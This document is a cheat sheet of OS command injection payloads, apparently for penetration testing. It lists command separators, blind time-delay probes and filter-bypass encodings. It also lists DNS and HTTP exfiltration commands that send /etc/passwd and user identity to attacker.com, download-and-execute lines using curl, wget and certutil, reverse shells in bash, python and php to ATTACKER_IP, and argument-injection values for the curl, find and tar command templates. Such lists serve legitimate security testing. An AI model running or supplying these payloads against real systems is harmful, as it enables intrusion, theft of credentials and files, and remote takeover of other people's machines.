## ============================================================
## OS Command Injection Payloads
## ============================================================

## ---- BASIC COMMAND SEPARATORS ----
;id
;whoami
|id
|whoami
||id
||whoami
&id
&whoami
&&id
&&whoami

## Newline
%0aid
%0awhoami
%0d%0aid

## Backticks (Unix)
`id`
`whoami`

## Command substitution (Unix)
$(id)
$(whoami)

## ---- COMMON INJECTION POINTS ----
## Ping / network tools
127.0.0.1;id
127.0.0.1|id
127.0.0.1||id
127.0.0.1&&id
127.0.0.1%0aid
`127.0.0.1`id

## Filename parameters
file.txt;id
file.txt|id
file.txt$(id)

## ---- BLIND COMMAND INJECTION (no output) ----
## Time-based detection
;sleep 10
|sleep 10
||sleep 10
& timeout /t 10
&& timeout /t 10
$(sleep 10)
`sleep 10`

## DNS exfiltration
;nslookup $(whoami).attacker.com
|nslookup `whoami`.attacker.com
;host $(whoami).attacker.com
$(nslookup $(whoami).attacker.com)

## HTTP exfiltration
;curl http://attacker.com/$(whoami)
;wget http://attacker.com/$(cat /etc/passwd|base64)
|curl http://attacker.com/?r=$(id|base64)
$(curl attacker.com/$(uname -a|base64))

## File write detection
;echo VULN > /tmp/cmdi_test
;copy NUL C:\temp\cmdi_test.txt

## ---- FILTER BYPASS TECHNIQUES ----
## Space bypass (Linux)
;{cat,/etc/passwd}
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;cat${IFS}${IFS}/etc/passwd
;X=$'cat\x20/etc/passwd'&&$X
;cat</etc/passwd
;IFS=,;`cat<<<cat,/etc/passwd`
;echo${IFS}"RCE"

## Space bypass (Windows)
;type%PROGRAMFILES:~10,-5%C:\windows\win.ini

## Keyword bypass — cat
;c'a't /etc/passwd
;c"a"t /etc/passwd
;c\at /etc/passwd
;ca$()t /etc/passwd
;/bin/c?t /etc/passwd
;/bin/ca* /etc/passwd

## Keyword bypass — /etc/passwd
;cat /e'tc'/pa'ss'wd
;cat /e"tc"/pa"ss"wd
;cat /et??as?wd
;cat /etc/pass*
;cat /etc/p??s?d

## Keyword bypass — id/whoami
;i'd'
;w'h'o'a'm'i
;/u??/b??/id
;/u??/b??/w?oam?

## Using variables
;a=i;b=d;$a$b
;a=who;b=ami;$a$b
;a=ca;b=t;$a$b /etc/passwd

## Hex encoding
;$(printf '\x69\x64')
;$(printf '\x77\x68\x6f\x61\x6d\x69')
;echo -e '\x69\x64' | sh

## Base64 encoding
;echo aWQ= | base64 -d | sh
;echo d2hvYW1p | base64 -d | sh
;bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)

## Using $() and ``
;$(echo id)
;`echo id`
;$(echo Y2F0IC9ldGMvcGFzc3dk|base64 -d)

## ---- WINDOWS-SPECIFIC PAYLOADS ----
& whoami
& dir C:\
& type C:\windows\win.ini
& net user
& net localgroup administrators
& ipconfig /all
& systeminfo
| powershell -c "Get-Process"
| powershell -c "Get-Content C:\windows\win.ini"
& certutil -urlcache -split -f http://attacker.com/shell.exe C:\temp\shell.exe

## Windows variable-based bypass
%COMSPEC:~-16,1%%COMSPEC:~-1%%COMSPEC:~-13,1% (= cmd)
set a=who&&set b=ami&&%a%%b%

## ---- LINUX-SPECIFIC PAYLOADS ----
;uname -a
;cat /etc/passwd
;ls -la /
;id
;ifconfig
;ip addr
;netstat -tlnp
;ps aux
;env
;cat /proc/self/environ
;curl attacker.com/shell.sh|sh
;wget -O- attacker.com/shell.sh|sh

## Reverse shell via injection
;bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
;python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
;php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

## ---- PARAMETER POLLUTION ----
## When input is placed in a command template
## Template: curl -s {user_input}
-o /tmp/shell.php http://attacker.com/shell.php
--url http://attacker.com -o /tmp/shell.php

## Template: find /path -name {user_input}
-exec id ;
-exec cat /etc/passwd ;

## Template: tar cf archive.tar {user_input}
--checkpoint=1 --checkpoint-action=exec=id

## ---- RUBY / PERL / NODE INJECTION ----
## Ruby
;system("id")
;exec("id")
;`id`

## Perl
;system("id")
;exec("id")
;print `id`

## Node.js (if eval-like)
require('child_process').execSync('id')

## ---- COMMON VULNERABLE PARAMETERS ----
## Watch for these parameter names during testing:
## ip, host, hostname, ping, url, uri, path, file, filename
## dir, cmd, exec, command, run, query, search, email, to
## domain, port, process, daemon, upload, download, log
